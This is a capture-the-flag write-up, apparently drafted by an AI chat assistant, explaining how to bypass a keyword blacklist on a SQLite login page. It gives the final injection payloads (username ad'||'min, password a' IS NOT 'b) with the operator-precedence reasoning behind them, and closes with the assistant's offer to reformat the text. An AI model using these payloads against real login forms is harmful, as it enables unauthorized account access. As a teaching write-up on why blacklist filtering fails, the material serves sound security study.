# ðŸ“ Web Gauntlet 2 â€” Filtered SQLite Injection Challenge #2

## ðŸ”Ž Initial Analysis

We are given a login panel and a separate `filter.php` page that shows the blocked keywords.

From `filter.php`, the following tokens are blacklisted:

```
or and true false union like = > < ; -- /* */ admin
```

The hint says:

* Filters are separated by spaces
* Spaces are not filtered
* Only one round

This strongly suggests:

* The backend uses SQLite
* Input is split by spaces and compared against a blacklist
* Classic `OR 1=1` will not work
* We must bypass the filter instead of using basic SQLi

---

## ðŸ§  Understanding the Vulnerability

The login query likely looks like:

```sql
SELECT * FROM users
WHERE username = '$user'
AND password = '$pass';
```

Since the filter only blocks space-separated words, we can bypass it by:

* Avoiding blacklisted tokens
* Using SQLite operators that are not filtered
* Exploiting operator precedence

---

## ðŸŽ¯ Username Bypass

The word `admin` is blocked.

However, SQLite allows string concatenation using `||`.

So instead of writing:

```sql
admin
```

We construct it dynamically:

```
ad'||'min
```

SQLite evaluates:

```
'ad' || 'min' â†’ 'admin'
```

The filter never sees `admin` as a standalone token.

âœ… Username condition becomes true.

---

## ðŸŽ¯ Password Bypass

We cannot use:

* `OR`
* `AND`
* `=`
* comments

So instead of breaking the query, we manipulate logic using SQLite operator precedence.

Password payload used:

```
a' IS NOT 'b
```

This makes the query become:

```sql
password = 'a' IS NOT 'b'
```

### Why This Works

Operator precedence in SQLite:

```
=    executes before    IS / IS NOT
```

So it evaluates as:

```sql
(password = 'a') IS NOT 'b'
```

Step 1:

```
password = 'a'
```

Returns either:

* 1 (true)
* 0 (false)

Step 2:

```
1 IS NOT 'b'
```

or

```
0 IS NOT 'b'
```

Both are TRUE because:

* 1 is not equal to 'b'
* 0 is not equal to 'b'

So the entire password condition becomes TRUE regardless of the real password.

---

## âœ… Final Payload

```
Username: ad'||'min
Password: a' IS NOT 'b
```

This results in:

```sql
WHERE username = 'admin'
AND TRUE
```

Login successful.

<img width="1361" height="540" alt="image" src="https://github.com/user-attachments/assets/7947fede-16e1-4151-8ab3-7033d0abddd4" />


<img width="1361" height="540" alt="image" src="https://github.com/user-attachments/assets/095e15e9-babf-4954-9940-2bdffe5c4b58" />

---

## ðŸ§  Key Takeaways

This challenge demonstrates:

* Blacklist filtering is weak security
* SQLite operator precedence can be abused
* `IS` and `IS NOT` behave differently from `=`
* String concatenation (`||`) can bypass keyword filters
* You donâ€™t always need `OR 1=1`

---

If you want, I can now:

* Make this into a clean GitHub-ready markdown file
* Or shorten it into a 5-minute presentation explanation
* Or make it more technical for advanced readers

You actually solved this in a smart way ðŸ”¥
